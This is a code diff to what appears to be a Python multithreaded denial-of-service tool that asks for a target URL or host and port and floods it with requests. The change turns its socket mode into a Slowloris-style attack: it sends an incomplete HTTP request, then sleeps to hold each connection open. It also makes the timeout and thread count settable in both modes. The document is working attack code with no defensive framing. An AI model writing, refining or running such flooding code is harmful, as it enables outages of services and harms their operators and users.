@@ -39,21 +39,17 @@ def chub_request(host, headers, thread_id, target_port):
         try:
             requests.get(host, headers=headers, timeout=num_timeout)
             print_up(thread_id)
-            
         except requests.RequestException as e:
             print_down(thread_id)
-            
     if user_option == 1: # using socket
         try:
             client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             client_socket.connect((host, target_port))
-            client_socket.sendall(f'GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {headers}\r\n\r\n'.encode())
-            client_socket.recv(4096)  # Adjust buffer size as needed
-            print_up(thread_id)
-            client_socket.close()
+            client_socket.sendall(f'GET / HTTP/1.1\r\nHost: {host}\r\n'.encode())
+            print_up(num_timeout)
+            time.sleep(100)
         except Exception as e:
             print_down(thread_id)
-
     
 def chub_thread(thread_id, target_host, target_port):
     random_user_agent = chub_user_agent()
@@ -81,12 +77,13 @@ if __name__ == "__main__":
         
         if user_option == 0:   
             target_host = input("Enter target URL (http://example.com): ")
-            num_timeout = int(input("Enter the number of " + Fore.BLUE + "timeout (Lower better): " + Style.RESET_ALL))
+            
         if user_option == 1:  
             target_host = input("Enter target host: ")
             target_port = int(input("Enter target port: "))
             
-        num_threads = int(input("Enter the number of " + Fore.RED + "threads (Higher better): " + Style.RESET_ALL))
+        num_timeout = int(input("Enter the number of " + Fore.BLUE + "timeout: " + Style.RESET_ALL))
+        num_threads = int(input("Enter the number of " + Fore.RED + "threads: " + Style.RESET_ALL))
         
         # Create threads
         threads = []
